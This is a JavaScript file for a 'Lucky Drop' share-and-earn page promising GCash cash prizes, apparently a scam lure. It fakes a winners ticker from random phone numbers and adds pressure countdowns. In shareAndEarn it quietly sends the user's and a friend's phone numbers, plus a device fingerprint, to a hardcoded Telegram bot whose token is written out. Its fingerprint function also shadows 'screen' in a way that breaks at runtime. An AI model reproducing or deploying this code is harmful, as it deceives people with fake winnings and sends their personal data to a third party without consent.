/**
 * Promotion Page - Share & Earn Logic
 * Lucky Drop Promo
 */

// ========== UNMUTE VIDEO ON INPUT FOCUS ==========
function unmuteAndPlayVideos() {
    const videos = document.querySelectorAll('video');
    videos.forEach(v => {
        v.muted = false;
        v.play().catch(e => console.log('Video play error:', e));
    });
}

// ========== RANDOM WINNERS TICKER ==========
const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0977", "0906", "0915"];
const amounts = [300, 500, 750, 1000, 1250, 1500];

function generateRandomWinner() {
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = Math.floor(1000 + Math.random() * 9000);
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    return { display: `${prefix}***${suffix}`, amount: amount };
}

function updateTicker() {
    const winner = generateRandomWinner();
    const winnerSpan = document.getElementById('winnerText');
    if (winnerSpan) {
        winnerSpan.innerHTML = `🎲 ${winner.display} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${winner.amount}`;
    }
}

// ========== MAIN COUNTDOWN (MAY 1, 2026) ==========
function updateMainTimer() {
    const targetDate = new Date(2026, 4, 1, 0, 0, 0);
    const now = new Date();
    const diff = targetDate - now;
    const timerDisplay = document.getElementById('mainTimerDisplay');
    if (!timerDisplay) return;
    
    if (diff <= 0) {
        timerDisplay.innerHTML = "00:00:00";
        return;
    }
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff % (86400000)) / 3600000);
    const minutes = Math.floor((diff % 3600000) / 60000);
    const seconds = Math.floor((diff % 60000) / 1000);
    timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// ========== DEVICE FINGERPRINT ==========
function getDeviceFingerprint() {
    const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const lang = navigator.language;
    const ua = navigator.userAgent;
    const fingerprintStr = `${ua}|${screen}|${timezone}|${lang}`;
    let hash = 0;
    for (let i = 0; i < fingerprintStr.length; i++) {
        hash = ((hash << 5) - hash) + fingerprintStr.charCodeAt(i);
        hash |= 0;
    }
    return `FP_${Math.abs(hash)}`;
}

// ========== GAME STATE ==========
let gameState = {
    shared: false,
    friendConfirmed: false,
    claimed: false,
    referralPhone: "",
    timerSeconds: 300,
    timerInterval: null,
    popupVisible: false
};

let db = null;
let userPhone = "";
let deviceId = "";

// ========== DOM ELEMENTS ==========
let shareBtn, prizePopupDiv, popupBalanceSpan, popupTimerSpan, claimBtn, fbBtn;
let ind1, ind2, ind3, statusMsgSpan, progressFill, friendInput;

// ========== INDICATORS ==========
function updateIndicators() {
    if (!ind1 || !ind2 || !ind3) return;
    ind1.className = 'indicator';
    ind2.className = 'indicator';
    ind3.className = 'indicator';
    if (gameState.shared) ind1.classList.add('indicator-red');
    if (gameState.friendConfirmed) ind2.classList.add('indicator-green');
    if (gameState.claimed) ind3.classList.add('indicator-blue');
}

function updateUI() {
    updateIndicators();
    if (gameState.shared && progressFill) {
        progressFill.style.width = '100%';
        if (statusMsgSpan) {
            statusMsgSpan.innerHTML = '<span class="status-locked" style="color:#39ff14;">🎉 Shared! Waiting for friend confirmation... 🎉</span>';
        }
    }
    if (gameState.claimed) {
        if (statusMsgSpan) {
            statusMsgSpan.innerHTML = '<span class="status-locked" style="color:#39ff14;">🏆 Prize claimed! 🏆</span>';
        }
        if (shareBtn) {
            shareBtn.disabled = true;
            shareBtn.style.opacity = '0.5';
        }
    }
    if (gameState.friendConfirmed && !gameState.claimed) {
        if (popupBalanceSpan) popupBalanceSpan.innerHTML = `₱300.00`;
    } else if (!gameState.claimed) {
        if (popupBalanceSpan) popupBalanceSpan.innerHTML = `₱150.00`;
    }
}

// ========== POPUP TIMER ==========
function updatePopupTimerDisplay() {
    if (!popupTimerSpan) return;
    const mins = Math.floor(gameState.timerSeconds / 60);
    const secs = gameState.timerSeconds % 60;
    popupTimerSpan.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    if (gameState.timerSeconds <= 0) {
        popupTimerSpan.innerHTML = "00:00";
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.5';
        }
    }
}

function startPopupTimer() {
    if (gameState.timerInterval) clearInterval(gameState.timerInterval);
    gameState.timerInterval = setInterval(() => {
        if (gameState.timerSeconds > 0) {
            gameState.timerSeconds--;
            if (gameState.popupVisible) updatePopupTimerDisplay();
            saveGameData();
        }
        if (gameState.timerSeconds <= 0) {
            clearInterval(gameState.timerInterval);
            gameState.timerInterval = null;
            if (gameState.popupVisible && popupTimerSpan) popupTimerSpan.innerHTML = "00:00";
        }
    }, 1000);
}

function showPrizePopup() {
    if (gameState.claimed) return;
    updatePopupTimerDisplay();
    if (prizePopupDiv) prizePopupDiv.style.display = 'flex';
    gameState.popupVisible = true;
    if (!gameState.timerInterval && gameState.timerSeconds > 0) startPopupTimer();
    unmuteAndPlayVideos();
}

function closePrizePopup() {
    if (prizePopupDiv) prizePopupDiv.style.display = 'none';
    gameState.popupVisible = false;
}

// ========== FIREBASE OPERATIONS ==========
async function loadGameData() {
    if (!db || !userPhone) return;
    const ref = db.ref('share_earn_device/' + deviceId);
    const snap = await ref.once('value');
    const data = snap.val();
    if (data) {
        gameState.shared = data.shared || false;
        gameState.friendConfirmed = data.friendConfirmed || false;
        gameState.claimed = data.claimed || false;
        gameState.referralPhone = data.referralPhone || "";
        gameState.timerSeconds = data.timerSeconds || 300;
        if (gameState.timerSeconds > 0 && gameState.shared && !gameState.claimed) {
            startPopupTimer();
        }
    }
    updateUI();
    if (gameState.shared && !gameState.claimed) {
        showPrizePopup();
    }
    if (gameState.claimed && shareBtn) {
        shareBtn.disabled = true;
        shareBtn.style.opacity = '0.5';
    }
}

async function saveGameData() {
    if (!db || !userPhone) return;
    const ref = db.ref('share_earn_device/' + deviceId);
    await ref.set({
        shared: gameState.shared,
        friendConfirmed: gameState.friendConfirmed,
        claimed: gameState.claimed,
        referralPhone: gameState.referralPhone,
        timerSeconds: gameState.timerSeconds,
        lastUpdate: Date.now()
    });
}

// ========== SHARE & UNLOCK ==========
async function shareAndEarn() {
    if (gameState.claimed) { alert("Prize already claimed!"); return; }
    if (gameState.shared) { alert("Already shared! Waiting for friend confirmation."); return; }
    if (!friendInput) return;
    const friendPhone = friendInput.value.trim();
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter a valid 11-digit mobile number starting with 09.");
        return;
    }
    if (!db) return;
    const deviceCheck = await db.ref('share_earn_device/' + deviceId).once('value');
    if (deviceCheck.exists() && deviceCheck.val().shared) {
        alert("This device already participated. Only one account per device allowed.");
        return;
    }
    gameState.shared = true;
    gameState.referralPhone = friendPhone;
    gameState.timerSeconds = 300;
    await saveGameData();
    startPopupTimer();
    updateUI();
    showPrizePopup();
    
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("📱 SHARE INITIATED\nDevice: " + deviceId + "\nUser: " + userPhone + "\nFriend: " + friendPhone)}`)
        .catch(e => console.log);
}

// ========== CHECK FRIEND CONFIRMATION ==========
async function checkFriendConfirmation() {
    if (gameState.friendConfirmed || gameState.claimed) return;
    if (!gameState.referralPhone || !db) return;
    const ref = db.ref('friend_confirmation/' + gameState.referralPhone);
    const snap = await ref.once('value');
    if (snap.exists() && snap.val().confirmed === true) {
        gameState.friendConfirmed = true;
        await saveGameData();
        updateUI();
        if (gameState.popupVisible && popupBalanceSpan) {
            popupBalanceSpan.innerHTML = `₱300.00`;
            const inviteDiv = document.querySelector('.invite-text');
            if (inviteDiv) inviteDiv.innerHTML = "✅ Friend confirmed! You can now claim ₱300!";
        }
        if (gameState.timerSeconds > 0 && claimBtn) {
            claimBtn.disabled = false;
            claimBtn.style.opacity = '1';
        }
    }
}

// ========== CLAIM THRU GCASH ==========
async function claimThruGCash() {
    if (gameState.claimed) { alert("Already claimed!"); return; }
    if (!gameState.friendConfirmed) { alert("Friend must confirm invitation first."); return; }
    if (gameState.timerSeconds <= 0) { alert("Time expired. Please try again."); return; }
    gameState.claimed = true;
    await saveGameData();
    updateUI();
    startConfetti();
    
    let gcashLink = "https://gcash.com/promo";
    if (db) {
        const snap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snap.exists()) {
            const key = Object.keys(snap.val())[0];
            gcashLink = snap.val()[key].url;
            await db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: 300, claimedAt: Date.now() });
        }
    }
    alert("Processing GCash claim... Redirecting.");
    setTimeout(() => { window.location.href = gcashLink; }, 1500);
}

// ========== SHARE TO FACEBOOK ==========
function shareToFacebook() {
    const url = encodeURIComponent(window.location.origin + "/index.html");
    window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank', 'width=600,height=400');
}

// ========== CONFETTI ==========
let confettiAnimation = null;

function startConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    canvas.style.display = 'block';
    const ctx = canvas.getContext('2d');
    const particles = [];
    for (let i = 0; i < 150; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 5 + 2,
            color: `hsl(${Math.random() * 60 + 40}, 100%, 60%)`,
            speed: Math.random() * 3 + 2,
            spin: Math.random() * 360
        });
    }
    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        let alive = false;
        for (let p of particles) {
            p.y += p.speed;
            p.spin += 5;
            if (p.y < canvas.height) {
                alive = true;
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.spin * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();
            }
        }
        if (alive) confettiAnimation = requestAnimationFrame(draw);
        else { cancelAnimationFrame(confettiAnimation); canvas.style.display = 'none'; }
    }
    draw();
    setTimeout(() => { if (confettiAnimation) cancelAnimationFrame(confettiAnimation); canvas.style.display = 'none'; }, 5000);
}

// ========== INITIALIZE ==========
function initPromotion() {
    // Get DOM elements
    friendInput = document.getElementById('friendPhoneInput');
    shareBtn = document.getElementById('shareButton');
    prizePopupDiv = document.getElementById('prizePopup');
    popupBalanceSpan = document.getElementById('popupBalanceAmount');
    popupTimerSpan = document.getElementById('popupTimerDisplay');
    claimBtn = document.getElementById('claimGCashBtn');
    fbBtn = document.getElementById('shareFBBtn');
    ind1 = document.getElementById('indicator1');
    ind2 = document.getElementById('indicator2');
    ind3 = document.getElementById('indicator3');
    statusMsgSpan = document.getElementById('statusMessage');
    progressFill = document.getElementById('progressFill');
    
    // Add event listeners
    if (friendInput) {
        friendInput.addEventListener('focus', unmuteAndPlayVideos);
        friendInput.addEventListener('click', unmuteAndPlayVideos);
    }
    if (shareBtn) shareBtn.onclick = shareAndEarn;
    if (claimBtn) claimBtn.onclick = claimThruGCash;
    if (fbBtn) fbBtn.onclick = shareToFacebook;
    
    window.closePrizePopup = closePrizePopup;
    
    // Initialize Firebase
    if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined') {
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        db = firebase.database();
    }
    
    userPhone = localStorage.getItem("userPhone") || "";
    deviceId = getDeviceFingerprint();
    
    // Start timers
    updateTicker();
    setInterval(updateTicker, 15000);
    updateMainTimer();
    setInterval(updateMainTimer, 1000);
    
    // Load data and start
    loadGameData();
    setInterval(checkFriendConfirmation, 5000);
    
    // Handle friend confirmation via URL
    const urlRef = new URLSearchParams(window.location.search).get('ref');
    if (urlRef && userPhone && db) {
        db.ref('friend_confirmation/' + urlRef).set({ confirmed: true, friend: userPhone, timestamp: Date.now() });
    }
}

// Start when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPromotion);
} else {
    initPromotion();
}
